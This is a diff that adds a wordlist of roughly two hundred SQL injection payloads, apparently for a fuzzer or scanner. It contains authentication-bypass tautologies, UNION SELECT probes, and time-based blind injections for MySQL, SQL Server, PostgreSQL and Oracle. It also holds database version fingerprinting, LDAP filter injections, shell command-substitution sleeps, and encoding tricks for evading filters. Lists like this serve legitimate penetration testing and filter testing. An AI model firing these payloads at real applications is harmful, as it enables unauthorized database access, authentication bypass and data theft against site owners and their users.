@@ -1,0 +1,197 @@
+
+ ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
+ SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
+ SELECT(UNHEX(UNHEX(333532453335324533323335)));
+ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)
+ or 0=0 --
+ or 1=1--
+ or%201=1
+ or%201=1 --
+" or "a"="a
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"%20or%20"x"="x
+"' or 1 --'"
+") or ("a"="a
+"0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z"
+"XOR(if(now()=sysdate(),sleep(15),0))XOR"
+%20$(sleep%2050)
+%20'sleep%2050'
+%27%20or%201=1
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
+' AND (SELECT 8871 FROM (SELECT(SLEEP(15)))uZxz)
+' if(1=1,sleep(10),0)/*'XOR(if(11999=111999,sleep(10),0))OR'"XOR(if(1999=1999,sleep(10),0))OR"*/ 
+' or '1'='1'--
+' or 0=0 #
+' or 0=0 --
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+'%20--
+'%20;
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%2b(select*from(select(sleep(20)))a)%2b'
+') or ('a'='a
+')%20or%20('x'='x
+'+OR+1=1--
+'+OR+1=1--+
+'+ORDER+BY+1--
+'+ORDER+BY+1--+
+'+UNION+SELECT+@@version--
+'+UNION+SELECT+NULL+FROM+DUAL--
+'+UNION+SELECT+NULL+FROM+DUAL--+
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL--+
+'+UNION+SELECT+SLEEP(10)--
+'+UNION+SELECT+SLEEP(10)--+
+'+union+select+null+from+dual--
+'--
+'--+
+'-if(1=2,'0','1')-'
+'0 or 1=1
+'; IF (1000=1000) WAITFOR DELAY '0:0:15'--
+'; IF (1=1) WAITFOR DELAY '0:0:15'--
+'; SELECT CASE WHEN (15141=15141) THEN 'a'||dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual--
+'; SELECT IF (14891=14891),SLEEP(20),'a')--
+';SELECT PG_SLEEP(15)--
+';WAITFOR DELAY '0:0:30'--
+'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+'admin'--
+'hi' or 'x'='x';
+'if(mid(@@version,1,1)=2
+'if(mid(@@version,1,1)=4
+'if(mid(@@version,1,1)=5
+'or 0=0 #
+'or%20select *
+'pg_sleep(20)
+(1)aND(1=1)
+(1)oR(1=1)
+(select(0)from(select(sleep(25)))v)
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+)pg_sleep(20)
++(select*from(select(sleep(15)))a)+'
++1=benchmark(40000000,sha(1))+and+1
++and+1234567890=1234567890
++and+sleep(0.0000001)
++or+1=1
++or+sleep(0.00000001)
+,(select * from (select(sleep(15)))a)
+--';
+-1 oR 1=1
+-1 || 1
+-1")oR"1"=("1
+-1")||"1"=("1
+-1"oR"1"="1
+-1"||"1"="1
+-1')oR'1'=('1
+-1')||'1'=('1
+-1'oR'1'='1
+-1'||'1'='1
+-1/**/oR/**/1=1
+-1`)oR`1`=(`1
+-1`)||`1`=(`1
+-1`oR`1`=`1
+-1`||`1`=`1
+-1||1
+-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)
+-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)
+-sleep/*f*/(10)
+0")+("1
+0"+"1
+0')+('1
+0'+'1
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+0+1
+0`)+(`1
+0`+`1
+1
+1 & 1
+1 && 2
+1 aND 1=1
+1"
+1"%"2
+1"&"1"="1
+1"&&"2"="1
+1")%("2
+1")&"1"=("1
+1")&&"1"=("1
+1")*("1
+1")>("0
+1")aND"1"=("1
+1"*"1
+1">"0
+1"aND"1"="1
+1%2
+1&&2
+1&1
+1'
+1' u%nion se%lect 1
+1' u%u006eion se%u006cect 1
+1'%'2
+1'&&'2'='1
+1'&'1'='1
+1')%('2
+1')&&'1'=('1
+1')&'1'=('1
+1')*('1
+1')>('0
+1')aND'1'=('1
+1'*'1
+1'//**/oR/**/50!=22;#
+1'=sleep(10)='1
+1'>'0
+1'aND'1'='1
+1*1
+1/**/aND/**/1=1
+1>0
+1`
+1`%`2
+1`&&`2`=`1
+1`&`1`=`1
+1`)%(`2
+1`)&&`1`=(`1
+1`)&`1`=(`1
+1`)*(`1
+1`)>(`0
+1`)aND`1`=(`1
+1`*`1
+1`>`0
+1`aND`1`=`1
+2")-("1
+2"-"1
+2')-('1
+2'-'1
+2-1
+2`)-(`1
+2`-`1
+;pg_sleep(20)
+<>"'%;)(&+
+=%20'
+=%20--
+=%20;
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D%20\x27
+\x3D%20\x3B'
+char%4039%41%2b%40SELECT
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+true
